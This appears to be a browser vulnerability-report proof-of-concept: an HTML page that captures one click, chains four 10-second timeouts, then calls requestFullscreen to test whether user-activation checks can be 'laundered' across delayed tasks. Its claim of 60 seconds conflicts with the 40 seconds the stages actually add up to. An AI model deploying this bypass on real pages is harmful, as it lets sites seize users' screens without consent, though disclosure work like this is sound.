<!DOCTYPE html>
<html>
<head>
    <title>VRP: Multi-Stage Gesture Laundering</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        #console { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: auto; }
        button { background: #0f0; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <h2>[RESEARCH] Gesture Activation Persistence</h2>
    <div id="console"></div><br>
    <button id="start">INITIALIZE CHAIN (CLICK TO START)</button>

    <script>
        const btn = document.getElementById('start');
        const con = document.getElementById('console');
        const T0 = () => performance.now();
        let startTime;

        function log(msg) {
            const ts = (T0() - startTime).toFixed(0);
            con.innerHTML += `[${ts}ms] ${msg}<br>`;
            con.scrollTop = con.scrollHeight;
        }

        // --- KONFIGURASI TAHAPAN (STAGES) ---
        // Kita pecah menjadi 10 detik per stage untuk mencapai 60 detik
        const stages = [10000, 10000, 10000, 10000]; 

        function executeStage(index) {
            if (index >= stages.length) {
                log("<b>FINAL STAGE REACHED.</b> Invoking sensitive API...");
                document.documentElement.requestFullscreen()
                    .then(() => log("<span style='color:cyan'>SUCCESS: GESTURE LAUNDERED (60s+)</span>"))
                    .catch(e => log("<span style='color:red'>EXPIRED: " + e.message + "</span>"));
                return;
            }

            log(`Stage ${index + 1}/${stages.length}: Nesting ${stages[index]}ms task...`);
            
            // Kuncinya: Task baru dibuat hanya setelah task sebelumnya selesai
            setTimeout(() => {
                executeStage(index + 1);
            }, stages[index]);
        }

        btn.onclick = () => {
            startTime = T0();
            btn.style.display = 'none';
            log("User gesture captured. Starting chain...");
            executeStage(0);
        };
    </script>
</body>
</html>
